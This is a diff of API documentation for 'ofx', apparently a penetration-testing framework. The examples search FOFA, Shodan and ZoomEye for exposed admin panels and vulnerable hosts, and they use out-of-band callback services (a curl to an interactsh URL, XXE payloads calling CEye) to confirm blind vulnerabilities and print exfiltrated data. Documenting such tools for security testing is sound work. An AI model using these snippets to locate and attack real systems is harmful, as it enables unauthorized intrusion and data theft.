@@ -11,16 +11,16 @@ FOFA (Cyberspace Assets Retrieval) search engine for discovering internet-connec
 **Initialization:**
 
 ```python
-from ofx.api.search import Fofa
+from ofx.api.search import FofaClient
 
 # Interactive mode (prompts for credentials)
-fofa = Fofa()
+fofa = FofaClient()
 
 # Programmatic mode
-fofa = Fofa(user="email@example.com", token="your_api_token")
+fofa = FofaClient(user="email@example.com", token="your_api_token")
 
 # Custom config location
-fofa = Fofa(conf_path=Path("/custom/path/config.ini"))
+fofa = FofaClient(conf_path=Path("/custom/path/config.ini"))
 ```
 
 **Basic Search:**
@@ -32,15 +32,9 @@ results = fofa.search('title="login"')
 # Multi-page search
 results = fofa.search('app="Apache" && country="US"', pages=3)
 
-# Search with size limit
-results = fofa.search('port=3306', size=100)
-
-# Access results
-for item in results:
-    print(f"Host: {item['host']}")
-    print(f"Port: {item['port']}")
-    print(f"Title: {item['title']}")
-    print(f"IP: {item['ip']}")
+# Access results (URLs)
+for url in results:
+    print(url)
 ```
 
 **Advanced Queries:**
@@ -64,19 +58,19 @@ results = fofa.search('asn="12345"')
 ```python
 # Find exposed admin panels
 admin_panels = fofa.search('title="Admin Panel" || title="Dashboard"', pages=5)
-for panel in admin_panels:
-    print(f"Found admin panel: https://{panel['host']}:{panel['port']}")
+for panel_url in admin_panels:
+    print(f"Found admin panel: {panel_url}")
 
 # Find specific vulnerabilities
 vulnerable = fofa.search('app="Apache Struts" && version="2.3.15"')
 
 # Search by organization
-company_assets = fofa.search('org="Example Corp"', size=200)
+company_assets = fofa.search('org="Example Corp"', pages=3)
 
 # Export results
 import json
 with open('targets.json', 'w') as f:
-    json.dump(results, f, indent=2)
+    json.dump(sorted(results), f, indent=2)
 ```
 
 ### Shodan
@@ -84,10 +78,10 @@ with open('targets.json', 'w') as f:
 Internet-wide scanning and service detection.
 
 ```python
-from ofx.api.search import Shodan
+from ofx.api.search import ShodanClient
 
 # Initialize
-shodan = Shodan(api_key="your_api_key")
+shodan = ShodanClient(token="your_api_key")
 
 # Search
 results = shodan.search('apache')
@@ -104,19 +98,16 @@ results = shodan.search('apache country:"US"')
 Cyberspace search engine for comprehensive asset discovery.
 
 ```python
-from ofx.api.search import ZoomEye
+from ofx.api.search import ZoomEyeClient
 
 # Initialize
-zoomeye = ZoomEye(api_key="your_api_key")
+zoomeye = ZoomEyeClient(token="your_api_key")
 
 # Web search
 results = zoomeye.search('app:apache')
 
-# Host search
-results = zoomeye.search_host('+port:80 +country:cn')
-
-# Domain search
-results = zoomeye.search_web('site:example.com')
+# Alternate query
+results = zoomeye.search('port:80 +country:cn')
 ```
 
 ## Out-of-Band Testing
@@ -128,13 +119,13 @@ Monitor DNS and HTTP callbacks for blind vulnerability detection.
 **Setup:**
 
 ```python
-from ofx.api.oob import CEye
+from ofx.api.oob import CEyeClient
 
 # Interactive setup
-ceye = CEye()
+ceye = CEyeClient()
 
 # Programmatic setup
-ceye = CEye(token="your_ceye_token")
+ceye = CEyeClient(token="your_ceye_token")
 ```
 
 **DNS Callbacks:**
@@ -154,11 +145,6 @@ time.sleep(5)
 # Verify callback received
 if ceye.verify_request(flag, type='dns'):
     print("DNS callback received - vulnerability confirmed!")
-    # Get detailed records
-    records = ceye.get_dns_records(filter=flag)
-    for record in records:
-        print(f"Time: {record['time']}")
-        print(f"Query: {record['name']}")
 ```
 
 **HTTP Callbacks:**
@@ -177,11 +163,9 @@ exploit_payload = {
 # Check for HTTP requests
 if ceye.verify_request(payload['flag'], type='http'):
     print("HTTP callback received!")
-    records = ceye.get_http_records(filter=payload['flag'])
-    for record in records:
-        print(f"IP: {record['remote_addr']}")
-        print(f"Path: {record['request_uri']}")
-        print(f"Headers: {record['headers']}")
+    exfil = ceye.exact_request(payload['flag'], type='http')
+    if exfil:
+        print(f"Exfiltrated: {exfil}")
 ```
 
 **Practical Examples:**
@@ -215,23 +199,22 @@ if ceye.verify_request(ssrf_payload['flag']):
 Self-hosted OOB interaction server.
 
 ```python
-from ofx.api.oob import Interactsh
+from ofx.api.oob import InteractshClient
 
 # Initialize
-interactsh = Interactsh()
+interactsh = InteractshClient()
 
-# Register a unique identifier
-session = interactsh.register()
-domain = session['domain']  # e.g., "xyz123.interact.sh"
+# Generate a unique URL + flag
+url, flag = interactsh.build_request(method="http")
 
 # Use in payload
-payload = f"curl http://{domain}"
+payload = f"curl {url}"
 
 # Poll for interactions
-interactions = interactsh.poll(session['id'])
+interactions = interactsh.poll()
 for interaction in interactions:
     print(f"Protocol: {interaction['protocol']}")
-    print(f"Request: {interaction['raw_request']}")
+    print(f"Request: {interaction['raw-request']}")
 ```
 
 ## Network Scanning
@@ -337,7 +320,7 @@ Payload hosting with SSL support.
 **Basic Usage:**
 
 ```python
-from ofx.api import PHTTPServer
+from ofx.api.httpserver import PHTTPServer
 
 # Simple HTTP server
 server = PHTTPServer(bind_ip='0.0.0.0', bind_port=8080)
@@ -443,8 +426,8 @@ jobs:
     steps:
       - name: FOFA Search
         script: |
-          from ofx.api.search import Fofa
-          fofa = Fofa()
+          from ofx.api.search import FofaClient
+          fofa = FofaClient()
           results = fofa.search('${{ inputs.target_query }}', size=${{ inputs.max_targets }})
           targets = [r['ip'] for r in results]
           print(f"targets={','.join(targets)}")
@@ -490,8 +473,8 @@ jobs:
     steps:
       - name: Generate OOB Payload
         script: |
-          from ofx.api.oob import CEye
-          ceye = CEye()
+          from ofx.api.oob import CEyeClient
+          ceye = CEyeClient()
           payload = ceye.build_request('xxe_test', type='http')
           xml = f'''<?xml version="1.0"?>
           <!DOCTYPE data [
@@ -517,17 +500,17 @@ jobs:
       - name: Verify Callback
         script: |
           import time
-          from ofx.api.oob import CEye
+          from ofx.api.oob import CEyeClient
           
           time.sleep(5)
-          ceye = CEye()
+          ceye = CEyeClient()
           payload = {{ steps.0.outputs.payload }}
           
           if ceye.verify_request(payload['flag'], type='http'):
               print("XXE Vulnerability Confirmed!")
-              records = ceye.get_http_records(filter=payload['flag'])
-              for record in records:
-                  print(f"Callback from: {record['remote_addr']}")
+              exfil = ceye.exact_request(payload['flag'], type='http')
+              if exfil:
+                  print(f"Exfiltrated: {exfil}")
           else:
               print("No callback received")
 ```
